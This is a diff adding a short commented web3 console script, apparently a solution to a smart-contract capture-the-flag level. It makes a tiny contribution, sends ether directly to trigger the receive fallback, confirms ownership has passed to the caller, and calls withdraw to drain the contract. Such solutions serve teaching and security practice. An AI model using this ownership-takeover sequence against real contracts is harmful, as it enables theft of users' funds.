@@ -1,0 +1,16 @@
+// first we become a contributor
+contract.contribute.sendTransaction({from: "0x22Dd089254De7A8Db2C4e60A10c60fea519C6ebC", to: "0xBA017A44cF6E4bC55CC0523E3B1ef73ee317d308", value:web3.utils.toWei('0.0000001','ether')})
+
+// we see it suceeds
+Number(await contract.getContribution())
+100000000000
+
+// we trigger the receive callback
+sendTransaction({from: "0x22Dd089254De7A8Db2C4e60A10c60fea519C6ebC", to: "0xBA017A44cF6E4bC55CC0523E3B1ef73ee317d308", value:web3.utils.toWei('0.0000001','ether')})
+
+// check that we are the owner from the previous fallback
+await contract.owner()
+'0x22Dd089254De7A8Db2C4e60A10c60fea519C6ebC'
+
+// get all funds
+await contract.withdraw();
